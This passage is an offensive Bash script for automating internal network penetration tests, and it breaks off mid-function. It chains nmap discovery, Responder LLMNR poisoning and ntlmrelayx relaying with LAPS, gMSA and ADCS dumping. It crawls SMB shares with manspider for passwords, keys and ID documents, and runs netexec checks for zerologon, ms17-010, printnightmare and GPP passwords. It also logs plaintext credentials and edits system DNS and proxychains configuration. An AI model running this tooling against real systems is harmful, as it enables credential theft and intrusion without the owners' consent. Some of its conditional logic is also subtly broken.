#!/bin/bash

#################################################################
#####  Developped by Aurélien BOURDOIS                      #####
#####  https://www.linkedin.com/in/aurelien-bourdois/       #####
#################################################################

# #++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
# ###################			FUNCTION CALLS 		#########################
# #++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
starter() {
	
	#to avoid error from netexec, put a random name on ${Username} variable
	if [ -z "${Username}" ]; then
		Username="anonymous"
	fi

	if [ -z "${Password}" ] && [ -z "$NT_Hash" ]; then
		Password="anonymous"
	fi

	while true; do
		read -p "Use proxychains ? : (yY/nN) " proxychains
		if [[ "${proxychains}" = "y" || "${proxychains}" = "Y" ]]; then
			proxychains="proxychains -q"
			break
		elif [[ "${proxychains}" = "n" || "${proxychains}" = "N" ]]; then
			proxychains=""
			break
		else
			echo "Error: unknown option"
		fi
	done

	if [ -n "${Password}" ]; then
		cme_creds="-p ${Password}"
	else
		cme_creds="-H ${NT_Hash}"
	fi
	
	# Paths
	ROOT_PATH="$(pwd)/${ProjectName}"
	date_log=$(date +"%Y_%m_%d_%Hh_%Mm")
	logfile=${ROOT_PATH}/log_${Username}_${date_log}.log
	net=$(python3 -c "print('$rangeIP'.split('/')[0])")
	DIR_PORTS="${ROOT_PATH}/ports"
	DIR_VULNS="${ROOT_PATH}/vulns"
	hostname_file=$(if [ -e "${ROOT_PATH}/hostname_file.txt" ]; then cat "${ROOT_PATH}/hostname_file.txt"; fi)

	# TimeReference
	start=$SECONDS

 	mkdir ${ROOT_PATH} 2>/dev/null
	excluded_hosts="$(ip -o -4 addr show $INTERFACE | awk '{print $4}' | cut -d'/' -f1)"
	RDP_TIMEOUT=7
	CME_TIMEOUT=15 #increase in case of slow network
	SNMP_TIMEOUT=3
	SPACE='   '
	
	################### RENAME TAB ##############################
	cat << 'EOF' > /tmp/set_title_tab.sh
#!/bin/bash

printf '\033]0;%s\007' "$1"
EOF

	chmod +x /tmp/set_title_tab.sh

	################### VARIABLES ##############################
	# Colors
	LIGHTRED="\033[1;31m"
	LIGHTGREEN="\033[1;32m"
	LIGHTORANGE="\033[1;33m"
	LIGHTBLUE="\033[1;34m"
	RESET="\033[0;00m"

	## Creation des dossiers 
 	mkdir ${ROOT_PATH}/scan_nmap 2>/dev/null
  	mkdir ${ROOT_PATH}/scan_nmap 2>/dev/null
  	mkdir ${ROOT_PATH}/ports 2>/dev/null
   	mkdir ${ROOT_PATH}/vulns 2>/dev/null

	if [ -e ${ROOT_PATH}/log_${Username}.log ];then
		rm ${ROOT_PATH}/log_${Username}.log
	fi
	banner
	pop_logger
}

######################## 	LOG FUNCTIONS  ##########################
log () {
	#anciennement $(echo $1 | sed 's/\n*//g')
	echo -e "$(date +%F-%T)  $(echo "$1" | sed ':a;N;$!ba;s/\n\([[:space:]]*\)/\1/g')" >> $logfile
	echo -e "$1"
}
red_log (){
	echo -e "$LIGHTRED$1 $RESET"
	echo -e "$(date +%F-%T)  $LIGHTRED$(echo "$1" | sed ':a;N;$!ba;s/\n\([[:space:]]*\)/\1/g')$RESET" >> $logfile
}
orange_log (){
	echo -e "$LIGHTORANGE$1 $RESET"
	echo -e "$(date +%F-%T)  $LIGHTORANGE$(echo "$1" | sed ':a;N;$!ba;s/\n\([[:space:]]*\)/\1/g')$RESET" >> $logfile
}
green_log (){
	echo -e "$LIGHTGREEN$1 $RESET"
	echo -e "$(date +%F-%T)  $LIGHTGREEN$(echo "$1" | sed ':a;N;$!ba;s/\n\([[:space:]]*\)/\1/g')$RESET" >> $logfile
}
blue_log (){
	echo -e "$LIGHTBLUE$1 $RESET"
	echo -e "$(date +%F-%T)  $LIGHTBLUE$(echo "$1" | sed ':a;N;$!ba;s/\n\([[:space:]]*\)/\1/g')$RESET" >> $logfile
}

################### BANNER ##############################
banner () {
	log "⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐"
	log "Starting $0 on: "
	log "IP range : $rangeIP"
	log "Username : ${Username}"
	if [ -n "$NT_Hash" ]; then
		log "NT_Hash  : $NT_Hash"
	else
		log "Password : ${Password}"
	fi
	log "Excluding: $excluded_hosts"
	log "⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐"
}

######################## 	POP UP LOGGER  ##########################
pop_logger () {
	if  which terminator > /dev/null 2>&1;then
		#terminator --new-tab -m -e "tail -F /root/test" &
		terminator --new-tab -m -e "source /tmp/set_title_tab.sh Enumeration; tail -F $logfile" &
	else
		#export QT_QPA_PLATFORM=offscreen 
		#qterminal -e "tail -F $logfile" &
		qterminal -e bash -c "source /tmp/set_title_tab.sh Enumeration; tail -F $logfile" &
	fi
	sleep 1
}

control_ip_attack() {
	#Calculate if the current IP is included within the networks targeted by the audit.
	TARGET_IP="${ip}"
	rangeIP_array=$(echo "$rangeIP" | tr ',' '\n')
	while IFS= read -r rangeIP_array_key; do
		if [[ "$rangeIP_array_key" =~ /32$ && "$TARGET_IP" == "${rangeIP_array_key%/32}" ]]; then
			return 0
		fi
		NETWORK_LAN=$(ipcalc -n -b $rangeIP_array_key | grep "Address:" | awk '{print $2}')
		NETWORK_LAN_BROADCAST=$(ipcalc -n -b $rangeIP_array_key | grep "Broadcast:" | awk '{print $2}')
		# Fonction pour convertir les adresses IP en entiers
		ip_to_int() {
			local a b c d
			IFS=. read -r a b c d <<< "$1"
			echo $((a * 256**3 + b * 256**2 + c * 256 + d))
		}
		# Convertir les adresses en entiers
		network_start=$(ip_to_int "$NETWORK_LAN")
		network_end=$(ip_to_int "$NETWORK_LAN_BROADCAST")
		target_ip_int=$(ip_to_int "$TARGET_IP")

		# Vérifier si l'IP cible est dans la plage
		if [[ $network_start -le $target_ip_int && $network_end -ge $target_ip_int ]]; then
			return 0
		fi
	done <<< "$rangeIP_array"
	return 1
}

########################### FAST SCAN NMAP #####################################
nmap_fast () {
	
	#### CALCUL DES IP ####
	MY_IP=$(ip -o -4 addr show $INTERFACE | awk '{print $4}' | cut -d'/' -f1)
	MY_IP_WITH_MASK=$(ip -o -4 addr show $INTERFACE | awk '{print $4}' | cut -f1)
	# Calculer l'adresse réseau pour arp discovery
	NETWORK_LAN=$(ipcalc -n -b $MY_IP_WITH_MASK | grep "Address:" | awk '{print $2}')
	NETWORK_LAN_BROADCAST=$(ipcalc -n -b $MY_IP_WITH_MASK | grep "Broadcast:" | awk '{print $2}')
	
	log "[!] Discovery mode : '$discovery_mode'"
	
	#If the discovery must be by ping requests :
	if [[ $discovery_mode == "arp-ping" ]] && [ -z "${proxychains}" ]; then
		rangeIP_array=$(echo "$rangeIP" | tr ',' '\n')
		for rangeIP_array_key in $rangeIP_array; do
			echo "Starting scan : $rangeIP_array_key"
			if echo $rangeIP_array_key | grep -vq "/32"; then
				TARGET_LAN=$(ipcalc -n -b $rangeIP_array_key  | grep "Network:" | awk '{print $2}')
				TARGET_LAN_BROADCAST=$(ipcalc -n -b $rangeIP_array_key | grep "Broadcast:" | awk '{print $2}')
			else
				TARGET_LAN=$(ipcalc -n -b $rangeIP_array_key  | grep "Address:" | awk '{print $2}')
				TARGET_LAN_BROADCAST=$TARGET_LAN
			fi
			# Convert IP addresses to integers for comparison
			ip_to_int() {
				local a b c d
				IFS=. read -r a b c d <<< "$1"
				echo $((a * 256**3 + b * 256**2 + c * 256 + d))
			}
			network_start=$(ip_to_int "$NETWORK_LAN")
			network_end=$(ip_to_int "$NETWORK_LAN_BROADCAST")
			target_start=$(ip_to_int "$TARGET_LAN")
			target_end=$(ip_to_int "$TARGET_LAN_BROADCAST")
			
			#If attack range is into the selected network interface
			if [[ $network_start -le $target_start && $network_end -ge $target_end ]]; then
				#ARP Scan
				#S'assurer que les excluded hosts ne sont pas inclu dans hosts.txt
				nmap -PR -sn $rangeIP_array_key | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' | grep -v $MY_IP > ${ROOT_PATH}/tmp_hosts.txt 2>&1
				grep -oE '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' ${ROOT_PATH}/tmp_hosts.txt >> ${ROOT_PATH}/hosts.txt
				rm ${ROOT_PATH}/tmp_hosts.txt
			else
				fping -g $rangeIP_array_key --alive -q | grep -v $MY_IP >> ${ROOT_PATH}/hosts.txt 2>/dev/null
    				sort -u ${ROOT_PATH}/hosts.txt -o ${ROOT_PATH}/hosts.txt
			fi
		done
		NMAP_HOSTS="-Pn -iL ${ROOT_PATH}/hosts.txt"
		log "${SPACE}[!] $(wc -l < "${ROOT_PATH}/hosts.txt") hosts detected via arp / ping"
	elif [ -z "${proxychains}" ]; then
		NMAP_HOSTS="-Pn $(echo "$rangeIP" | tr ',' ' ')"
	fi
	
	log "[🔍] Scanning NMAP - Fast version"
	#Fast NMAP TCP
	if [ -n "${proxychains}" ]; then
		#Proxychains ne comprenant pas les requetes personnalisés, nous lui indiqueront de faire des requetes full (sT)
		#${proxychains} nmap -sT -Pn ${NMAP_HOSTS} -R -oA ${ROOT_PATH}/scan_nmap/scan_Fast_TCP --top 1000 --open --exclude $excluded_hosts >/dev/null 2>&1
		blue_log "Import 'nmap binaries' on the victim to do a nmap from the linux target (too slow through proxychains)"
		blue_log "nmap -sV -Pn -T4 --open -oA scan_Fast_TCP $rangeIP"
		blue_log "nmap -Pn -sU --open --top 25 -oA scan_Full_UDP $rangeIP"
		blue_log "Then exfiltrate nmap reports to '${ROOT_PATH}/scan_nmap/' on the attacker's machine"
		blue_log "Then mount the proxychains"
		log "Press Entrer when ready ..."
		read
	else
		log "${SPACE}[📂] TCP Scanning ..."
		#Si pas proxychains, sS pour TCP
		#ports=$(nmap -p- --min-rate=1000 -T4 $target | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//); echo "nmap -p $ports -sT -sV -T4 -R $target"; nmap -p $ports -sT -sV -T4 -R $target
		nmap ${NMAP_HOSTS} -sT -T4 -oA ${ROOT_PATH}/scan_nmap/scan_TCP_ports --open --exclude $excluded_hosts >/dev/null 2>&1
		
		ports=$(grep -oP '^\d{1,5}/(tcp|udp)' ${ROOT_PATH}/scan_nmap/scan_TCP_ports.nmap | awk -F'/' '{print $1}' | sort -u | paste -sd, -)
		nmap ${NMAP_HOSTS} -sT -sV -T4 -p $ports -oA ${ROOT_PATH}/scan_nmap/scan_Fast_TCP --open --exclude $excluded_hosts >/dev/null 2>&1
		#log "${SPACE}[!] Nmap TCP report : ${ROOT_PATH}/scan_nmap/scan_Fast_TCP.nmap"
		log "${SPACE}[📂] UDP Scanning ..."
		#UDP
		UDP_PORTS=$(nmap -Pn -sU ${NMAP_HOSTS} -R --open --top 25 -T4 --exclude $excluded_hosts | grep -v filtered | grep -oP '^\d+(?=/udp)' | paste -sd',' -)
  		nmap -Pn -sU ${NMAP_HOSTS} -R -oA ${ROOT_PATH}/scan_nmap/scan_Full_UDP -p $UDP_PORTS --open -T4 --exclude $excluded_hosts >/dev/null 2>&1
	fi
	
	#log "${SPACE}[!] Nmap UDP report : ${ROOT_PATH}/scan_nmap/scan_Full_UDP.nmap"
	
	#Convert to html
	#TCP
	sed -i 's/href="nmap\.xsl/href="file:\/\/\/usr\/bin\/\.\.\/share\/nmap\/nmap\.xsl/g' ${ROOT_PATH}/scan_nmap/scan_Fast_TCP.xml
	xsltproc ${ROOT_PATH}/scan_nmap/scan_Fast_TCP.xml -o ${ROOT_PATH}/scan_Fast_TCP.html
	log "${SPACE}[!] Nmap TCP report in HTML format : ${ROOT_PATH}/scan_Fast_TCP.html"
	
	#UDP
	cat ${ROOT_PATH}/scan_nmap/scan_Full_UDP.nmap | grep -v "open|filtered" > ${ROOT_PATH}/scan_nmap/scan_Full_UDP_open.nmap
	sed -i 's/href="nmap\.xsl/href="file:\/\/\/usr\/bin\/\.\.\/share\/nmap\/nmap\.xsl/g' ${ROOT_PATH}/scan_nmap/scan_Full_UDP.xml
	#Delete ip block without explicit opened port (for better lisibility in html)
	awk '
	/<host / {
		in_block = 1;
		block = $0;
		has_open = 0;
		next
	}
	/<\/host>/ {
		block = block $0
		if (has_open) {
			print block
		}
		in_block = 0
		next
	}
	/<port .*state="open"/ {
		has_open = 1
	}
	{
		if (in_block) {
			block = block $0 "\n"
		} else {
			print
		}
	}
	' "${ROOT_PATH}/scan_nmap/scan_Full_UDP.xml" > "${ROOT_PATH}/scan_nmap/scan_Full_UDP_filtered.xml"
	xsltproc ${ROOT_PATH}/scan_nmap/scan_Full_UDP_filtered.xml -o ${ROOT_PATH}/scan_Full_UDP.html
	#Suppression des filtered|opened
	awk 'BEGIN { RS="</tr>" } /open\|filtered/ { next } { printf "%s", $0 "</tr>" }' ${ROOT_PATH}/scan_Full_UDP.html > ${ROOT_PATH}/scan_Full_UDP_open.html
	log "${SPACE}[!] Nmap UDP report in HTML format : ${ROOT_PATH}/scan_Full_UDP_open.html"
	
	#Extracting IP from the 2 reports
	grep -i 'Nmap scan report for' "${ROOT_PATH}/scan_nmap/scan_Fast_TCP.nmap" | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' >> ${ROOT_PATH}/hosts.txt
	grep -i 'Nmap scan report for' "${ROOT_PATH}/scan_nmap/scan_Full_UDP.nmap" | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' >> ${ROOT_PATH}/hosts.txt
	
	#Compilation TCP + UDP report
	cat ${ROOT_PATH}/scan_nmap/scan_Full_UDP_open.nmap ${ROOT_PATH}/scan_nmap/scan_Fast_TCP.nmap > ${ROOT_PATH}/scan_nmap/scan_Full_Fast.nmap 
	
	sort -u ${ROOT_PATH}/hosts.txt -o ${ROOT_PATH}/hosts.txt

	log "${SPACE}[!] NMAP scan detected $(wc -l "${ROOT_PATH}/hosts.txt" | awk '{print $1}') machines"
		
	#resolution_ip=$(cat ${ROOT_PATH}/hosts.txt)
	#for ip in $resolution_ip; do
	#	tmp_resolution=$(${proxychains} timeout 3 netexec smb ${ip} < /dev/null 2>/dev/null)
	#	echo "$tmp_resolution" | awk '{print $2 ":" $4}' >> ${ROOT_PATH}/hostname_file.txt
	#done
	
	##Tri par ports :
	log "${SPACE}[!] Sorting by opened ports ..."
	fichier_nmap="${ROOT_PATH}/scan_nmap/scan_Full_Fast.nmap"
	
	# Parcourir le fichier Nmap
	#Initiliser le fichier ${ROOT_PATH}/hostname_file.txt
	if [ -e ${ROOT_PATH}/hostname_file.txt ];then
		rm ${ROOT_PATH}/hostname_file.txt
		touch ${ROOT_PATH}/hostname_file.txt
	fi
	
	while IFS= read -r ligne; do
		if [[ $ligne == "Nmap scan report for"* ]]; then
			# Extraire l'adresse IP
			ip=$(echo "$ligne" | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}')
			resolve="0"
			domain_nmap=''
			host_nmap=''
		elif [[ $ligne =~ ^([0-9]+)/tcp ]] || [[ $ligne =~ ^([0-9]+)/udp ]]; then
			# Extraire le numéro de port et le nom du protocole
			port="${BASH_REMATCH[1]}"
			protocole="${BASH_REMATCH[2]}"
			# Ajouter l'IP à son fichier correspondant
			echo "${ip}" >> "${DIR_PORTS}/${port}.txt"
			#Si le script est executé plusieurs fois, supprimera les doublons
			sort -u ${DIR_PORTS}/${port}.txt -o ${DIR_PORTS}/${port}.txt
		fi
	done < "$fichier_nmap"
	
	log "${SPACE}[!] Name Resolution machines ... "
	resolve="0"
	while IFS= read -r ligne; do
		#Extraction de la résolution DNS des machines (si elle n'est pas résolue)
		if [[ $ligne == "Nmap scan report for"* ]]; then
			resolve="0"
			ip=$(echo "$ligne" | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}')
		fi
		if [[ "$resolve" == "0" ]]; then
			regex_Domain='Domain: ([A-Za-z0-9.-]+[^A-Za-z]*)'
			regex_Host='Service Info: Host: ([^;]+)'
			FQDN=$(echo "$ligne" | grep 'Nmap scan report for' | awk '{if ($5 ~ /[a-zA-Z]/) print $5}')
			regex_FQDN='FQDN: ([A-Za-z0-9.-]+)'
			regex_RDP_info_DNS='DNS_Computer_Name: ([A-Za-z0-9.-]+)'
			if [[ $ligne =~ $regex_Host ]];then
				host_nmap="${BASH_REMATCH[1]}"
			fi
			if [ -n "$FQDN" ] && [[ ! "$FQDN" =~ \.lan$ ]] && [[ "$FQDN" =~ ^[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+$ ]]; then
				echo "${ip}:${FQDN}" >> ${ROOT_PATH}/hostname_file.txt
				resolve="1"
			elif [[ $ligne == "Nmap scan report for"* ]];then
				netexec_port=""
				if grep -qs ${ip} "${DIR_PORTS}/445.txt";then
					netexec_port="smb"
				elif grep -qs ${ip} "${DIR_PORTS}/3389.txt";then
					netexec_port="rdp"
				elif grep -qs ${ip} "${DIR_PORTS}/5985.txt";then
					netexec_port="winrm"
				fi
				if [ -n "$netexec_port" ]; then
					${proxychains} netexec ${netexec_port} ${ip} < /dev/null > ${ROOT_PATH}/tmp_resolve.txt 2>/dev/null
					if [[ $(cat ${ROOT_PATH}/tmp_resolve.txt | grep -oP 'name:\K[^)]+') ]] && ([[ $(cat ${ROOT_PATH}/tmp_resolve.txt | grep -oP 'domain:\K[^)]+') ]] || [[ $(cat ${ROOT_PATH}/tmp_resolve.txt | grep -oP 'workgroup:\K[^)]+') ]]); then
						# Extraire le nom, le domaine ou le workgroup à partir de la sortie
						name=$(cat ${ROOT_PATH}/tmp_resolve.txt | grep -oP 'name:\K[^)]+')
						domain_workgroup=$(cat ${ROOT_PATH}/tmp_resolve.txt | grep -oP '(domain|workgroup):\K[^)]+')
						ip_regex='^([0-9]{1,3}\.){3}[0-9]{1,3}$'
						#Confirm that name or domain_workgroup are not ip_address
						if [[ ! "$name" =~ ${ip}_regex ]]; then
							echo "${ip}:${name}.${domain_workgroup}" >> ${ROOT_PATH}/hostname_file.txt
							resolve="1"
						fi
					fi
				fi
			elif [[ $ligne =~ $regex_Domain ]];then
				#Delete potential non alphabetic caracters at the end (ex: ctf.lab0.)
				domain_nmap="${BASH_REMATCH[1]}"
				cleaned_domain=$(echo "$domain_nmap" | sed 's/[^a-zA-Z]*$//')
				if [[ -n "$host_nmap" ]] && [[ -n "$cleaned_domain" ]];then
					#If $host_nmap and $cleaned_domain are found, then write them to /etc/hosts
					echo "${ip}:${host_nmap}.${cleaned_domain}" >> ${ROOT_PATH}/hostname_file.txt
					resolve="1"
				fi
			elif [[ $ligne =~ $regex_FQDN ]] || [[ $ligne =~ $regex_RDP_info_DNS ]];then
				FQDN="${BASH_REMATCH[1]}"
				echo "${ip}:${FQDN}" >> ${ROOT_PATH}/hostname_file.txt
				resolve="1"
			fi
		fi
	done < "$fichier_nmap"
	sort -u ${ROOT_PATH}/hostname_file.txt -o ${ROOT_PATH}/hostname_file.txt

	#log "[!] Updating DNS resolver with potential domain found ... "
 	if [ -s "${DIR_PORTS}/636.txt" ] || [ -s "${DIR_PORTS}/389.txt" ]; then
		ip=$(cat ${DIR_PORTS}/636.txt ${DIR_PORTS}/389.txt | sort -u | head -n 1)
		domain=$(grep -E "^${ip}:" ${ROOT_PATH}/hostname_file.txt | awk -F ":" '{print $2}' | cut -d '.' -f 2-)
		
		#Backup original file
		if [ ! -f "/etc/systemd/resolved.conf.bkp" ]; then
			cp /etc/systemd/resolved.conf /etc/systemd/resolved.conf.bkp
		fi
		cp /etc/systemd/resolved.conf.bkp /etc/systemd/resolved.conf
		echo "DNS=${ip}" >> /etc/systemd/resolved.conf
		echo "Domains=${domain}" >> /etc/systemd/resolved.conf
		sudo systemctl restart systemd-resolved
  	fi
}

########################## SMB NTLM RELAY ##################################
relay () {
	log "[🔍] Getting hosts with Relayable SMB"
	mkdir ${DIR_VULNS}/NTLM_relay 2>/dev/null
	${proxychains} netexec smb ${ROOT_PATH}/hosts.txt --gen-relay-list ${DIR_VULNS}/NTLM_relay/ntlm-relay-list.txt < /dev/null > /dev/null 2>&1
	# Add 'Skip_Responder_Already_Seen = Off' after 'AutoIgnoreAfterSuccess' if not present (to allow capturing multiple hashes from same user/host)
	grep -q '^Skip_Responder_Already_Seen' /usr/share/responder/Responder.conf || sed -i '/^AutoIgnoreAfterSuccess.*/a Skip_Responder_Already_Seen = Off' /usr/share/responder/Responder.conf
	if [ -f "${DIR_VULNS}/NTLM_relay/ntlm-relay-list.txt" ];then
 		sort -u ${DIR_VULNS}/NTLM_relay/ntlm-relay-list.txt -o ${DIR_VULNS}/NTLM_relay/ntlm-relay-list.txt
		nb_relay_vulnerable=$(cat ${DIR_VULNS}/NTLM_relay/ntlm-relay-list.txt | wc -l)
		green_log "${SPACE}[💀] Found $nb_relay_vulnerable devices vulnerable to NTLM relay in the $rangeIP network -> ${DIR_VULNS}/NTLM_relay/ntlm-relay-list.txt"
		#If prochains isn't enabled then try to catch something with responder and ntlmrelay
		if [ -z "${proxychains}" ];then
			#Turn off SMB,HTTP and HTTPS server on Responder.conf file
			responder_file="/usr/share/responder/Responder.conf"
			sed -i '/^\s*SMB\s*=\s*On/s/= On/= Off/; /^\s*HTTPS\s*=\s*On/s/= On/= Off/; /^\s*HTTP\s*=\s*On/s/= On/= Off/' "$responder_file"
			#Configure proxychains port 1080 (ntlmrelayx) and dynamic_chain (to have possibility of multiples socks)
			config_file="/etc/proxychains4.conf"
			sed -i '/^strict_chain/s/^/#/' "$config_file"
			sed -i '/^random_chain/s/^/#/' "$config_file"
			sed -i '/^#.*dynamic_chain/s/^#//' "$config_file"
			grep -q "^socks.* 127.0.0.1 1080" "$config_file" || echo 'socks4  127.0.0.1 1080' >> "$config_file"
			#responder -I eth0 -b --lm --disable-ess -v; exec bash
			if ! which ntlmrelayx.py >/dev/null 2>&1 && ! which ntlmrelayx >/dev/null 2>&1; then
				cp /usr/share/doc/python3-impacket/examples/ntlmrelayx.py /usr/bin/
				chmod +x /usr/bin/ntlmrelayx.py
			fi
			if  which terminator > /dev/null 2>&1;then
				#terminator --new-tab -m -e "tail -F /root/test" &
				terminator --new-tab -m -e "source /tmp/set_title_tab.sh Responder; responder -I ${INTERFACE} -b --disable-ess -v; sleep 5d" &
				sleep 1
				terminator --new-tab -m -e "source /tmp/set_title_tab.sh RelayNTLM; impacket-ntlmrelayx -tf ${DIR_VULNS}/NTLM_relay/ntlm-relay-list.txt -smb2support -socks --output-file ${DIR_VULNS}/NTLM_relay/ --dump-laps --dump-gmsa --dump-adcs; sleep 5d" &
			else
				#export QT_QPA_PLATFORM=offscreen 
				#qterminal -e "tail -F $logfile" &
				x-terminal-emulator -e "source /tmp/set_title_tab.sh Responder; responder -I ${INTERFACE} -b --disable-ess -v; sleep 5d" &
				sleep 1
				x-terminal-emulator -e "source /tmp/set_title_tab.sh RelayNTLM; impacket-ntlmrelayx -tf ${DIR_VULNS}/ntlm-relay-list.txt -smb2support -socks --output-file ${DIR_VULNS}/NTLM_relay/ --dump-laps --dump-gmsa --dump-adcs; sleep 5d" &
			fi
			blue_log "${SPACE}[💀] NTLM Relay started, look at socks and folder ${DIR_VULNS}/NTLM_relay/ for user's netNTLM hashes"
		else
  			green_log "${SPACE}[💀] Found $nb_relay_vulnerable devices vulnerable to NTLM relay in the $rangeIP network -> ${DIR_VULNS}/NTLM_relay/ntlm-relay-list.txt"
			blue_log "${SPACE} [!] Impossible to launch NTLM Relay via proxychains"
		fi
	else
		red_log "${SPACE}[X] No NTLM relay possible for this range $rangeIP"
		responder_file="/usr/share/responder/Responder.conf"
		sed -i '/^\s*SMB\s*=\s*Off/s/= Off/= On/; /^\s*HTTPS\s*=\s*Off/s/= Off/= On/; /^\s*HTTP\s*=\s*Off/s/= Off/= On/' "$responder_file"
		if  which terminator > /dev/null 2>&1;then
			#terminator --new-tab -m -e "tail -F /root/test" &
			terminator --new-tab -m -e "source /tmp/set_title_tab.sh Responder; responder -I ${INTERFACE} -b --disable-ess -v; sleep 5d" &
		else
			#export QT_QPA_PLATFORM=offscreen 
			#qterminal -e "tail -F $logfile" &
			x-terminal-emulator -e "source /tmp/set_title_tab.sh Responder; responder -I ${INTERFACE} -b --disable-ess -v; sleep 5d" &
		fi
	fi
}

manspider () {
	if [ -e "${DIR_PORTS}/445.txt" ]; then
		max_size_files_checked="15M"
		threads="100"
		wordlist="confiden classified bastion '\bcode\w*' creds credential wifi hash ntlm '\bidentifiant\w*' compte utilisateur '\buser\w*' '\b\$.*pass\w*' '\root\w*' '\b\$.*admin\w*' '\badmin\w*' account login 'cpassword\w*' 'pass\w*' cred '\b\$.*pass\w*' cisco pfsense pfx ppk rsa ssh rsa '\bcard\w*' '\bcarte\w*' '\bidentite\w*' '\bidentité\w*' '\bpasseport\w*'"
		exclusions="--exclude-dirnames AppData --exclude-extensions DAT LOG2 LOG1 lnk msi"
		request_manspider="${proxychains} manspider -n -s $max_size_files_checked -t $threads -c $wordlist $exclusions"
		manspider_ip=$(cat ${DIR_PORTS}/445.txt | paste -sd " ")
		log "[🔍] Launching manspider"
		log "[!]  If kerberos only : Netexec spider !"
		if  which terminator > /dev/null 2>&1;then
			terminator --new-tab -m -e "source /tmp/set_title_tab.sh Manspider; $request_manspider -u ${Username} ${cme_creds} $manspider_ip; sleep 5d" &
		else
			#export QT_QPA_PLATFORM=offscreen 
			#qterminal -e "tail -F $logfile" &
			qterminal -e bash -c "source /tmp/set_title_tab.sh Manspider; $request_manspider -u ${Username} ${cme_creds} $manspider_ip; sleep 5d" &
		fi
	fi
}

########################### CHECK vulnerabilities ##################################

vulns () {
	log "[🔍] Starting vulnerabilty scans on all devices"
	if [[ "${Username}" != "anonymous" ]];then
		#smb_modules_devices=(coerce_plus ms17-010 zerologon spooler webdav install_elevated gpp_password gpp_autologin enum_av enumdns veeam msol)
		smb_modules_devices=(ms17-010 zerologon smbghost printnightmare coerce_plus spooler webdav install_elevated gpp_password gpp_autologin enum_av enumdns veeam msol)
	else
		smb_modules_devices=""
	fi
	smb_modules_devices_anonymous=(ms17-010 zerologon smbghost printnightmare coerce_plus)
	Devices=$(cat ${ROOT_PATH}/ports/445.txt)
	
	for module in ${smb_modules_devices_anonymous[@]};do
		log "${SPACE}[👁️ ] Checking ${module} vulnerabilies ..."
		for ip in $Devices; do
			if control_ip_attack; then
				host=${ip}
				hostname=$(grep -E "^${ip}:" ${ROOT_PATH}/hostname_file.txt | awk -F ":" '{print $2}')
				${proxychains} timeout ${CME_TIMEOUT} netexec smb $host -u '' -p '' -M ${module} < /dev/null > ${DIR_VULNS}/Vulns_Device_anonymous_${ip}_${module}.txt 2>/dev/null
				#cat ${DIR_VULNS}/Vulns_Device_tmp_${module}.txt
				if ! grep -Eqio "Unable to detect|does NOT appear vulnerable" ${DIR_VULNS}/Vulns_Device_anonymous_${ip}_${module}.txt && grep -Eqio "vulnerable" ${DIR_VULNS}/Vulns_Device_anonymous_${ip}_${module}.txt;then
					if grep -Eqio "COERCE_PLUS" "${DIR_VULNS}/Vulns_Device_anonymous_${ip}_${module}.txt" && grep -Eqio "vulnerable" "${DIR_VULNS}/Vulns_Device_anonymous_${ip}_${module}.txt"; then
						coerce_vulns=$(cat ${DIR_VULNS}/Vulns_Device_anonymous_${ip}_${module}.txt | grep -i "COERCE_PLUS" | awk -F ", " '{print $2}')
						for coerce_vulns_key in $coerce_vulns; do
							green_log "${SPACE}${SPACE}[💀] Vulnerabilty '$coerce_vulns_key' via anonymous login found on ${ip} (${hostname}) ! -> ${DIR_VULNS}/Vulns_Device_anonymous_${ip}_${module}.txt"
							echo ${ip} >> "${DIR_VULNS}/Vulns_Devices_$coerce_vulns_key.txt"
						done
					elif ! grep -Eqio "COERCE_PLUS" ${DIR_VULNS}/Vulns_Device_anonymous_${ip}_${module}.txt; then
						green_log "${SPACE}${SPACE}[💀] Vulnerabilty '${module}' via anonymous login found on ${ip} (${hostname}) ! -> ${DIR_VULNS}/Vulns_Device_anonymous_${ip}_${module}.txt"
						echo ${ip} >> "${DIR_VULNS}/Vulns_Devices_${module}.txt"
					fi
				fi
			fi
		done
	done
	
	for module in ${smb_modules_devices[@]};do
		log "${SPACE}[👁️ ] Checking ${module} vulnerabilies ..."
		#if [[ "${module}" == "coerce_plus" ]]; then
		#	option_vulns="-o LISTENER=$(ip -o -4 addr show $INTERFACE | awk '{print $4}' | cut -d'/' -f1)"
		#else
		#	option_vulns=""
		#fi
		for ip in $Devices; do
			if control_ip_attack; then
				host=${ip}
				hostname=$(grep -E "^${ip}:" ${ROOT_PATH}/hostname_file.txt | awk -F ":" '{print $2}')
				#echo "${proxychains} timeout ${CME_TIMEOUT} netexec smb $host -u ${Username} ${cme_creds} -M ${module} ${option_vulns} < /dev/null > ${DIR_VULNS}/Vulns_Device_${ip}_${module}.txt 2>/dev/null"
				${proxychains} timeout 30 netexec smb $host -u ${Username} ${cme_creds} -M ${module} ${option_vulns} < /dev/null > ${DIR_VULNS}/Vulns_Device_${ip}_${module}.txt 2>/dev/null
				#grep -L "Exception while" ${DIR_VULNS}/* | xargs cat | grep -Ev 'SMBv|STATUS_ACCESS_DENIED|Unable to detect|does NOT appear|sodebo\.fr\\:|Error while|STATUS_LOGON_FAILURE'
				if grep -Eqo "STATUS_NOT_SUPPORTED|Failed to authenticate the user .* with ntlm" ${DIR_VULNS}/Vulns_Device_${ip}_${module}.txt;then
					if [[ -z ${hostname} ]];then
						kerberos="-d $(echo "${hostname}" | cut -d '.' -f 2-) --kerberos"
						host="${hostname}"
					fi
					${proxychains} timeout 30 netexec smb $host -u ${Username} ${cme_creds} ${kerberos} -M ${module} ${option_vulns} < /dev/null > ${DIR_VULNS}/Vulns_Device_${ip}_${module}.txt 2>/dev/null
				fi
				if [[ ! -f "${DIR_VULNS}/Vulns_Device_${ip}_${module}.txt" ]]; then
      				continue
    			fi

